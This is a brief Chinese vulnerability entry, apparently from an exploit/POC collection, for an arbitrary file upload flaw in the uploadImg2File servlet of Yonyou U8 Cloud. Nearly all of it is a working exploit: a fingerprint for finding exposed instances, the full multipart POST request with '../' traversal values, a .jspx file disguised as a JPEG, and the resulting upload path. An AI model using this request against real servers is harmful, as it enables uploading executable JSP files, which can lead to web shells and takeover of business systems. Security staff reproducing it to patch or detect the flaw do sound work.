# 用友U8ClouduploadImg2File任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /hrss/servlet/uploadImg2File HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 651`　`Content-Type: multipart/form-data;    boundary=----WebKitFormBoundary6veAf…`　`Cookie: JSESSIONID=882076295B79AA8C024D8F4FC5DDFF97.server; JSESSIONID=C717FE1B698660C55…`

**请求体 / payload**
```
------WebKitFormBoundary6veAfRuWsMCxTodB
Content-Disposition: form-data; name="x"
../
------WebKitFormBoundary6veAfRuWsMCxTodB
Content-Disposition: form-data; name="y"
../
------WebKitFormBoundary6veAfRuWsMCxTodB
Content-Disposition: form-data; name="w"
../
------WebKitFormBoundary6veAfRuWsMCxTodB
Content-Disposition: form-data; name="h"
../
------WebKitFormBoundary6veAfRuWsMCxTodB
Content-Disposition: form-data; name="txtFileName"; filename="stc.jspx"
Content-Type: image/jpeg
123
------WebKitFormBoundary6veAfRuWsMCxTodB--

上传文件位置
/hrss/uploads/202311091242211699461741771.jspx
```

**其他**
- 用友U8 Cloud uploadImg2File 任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud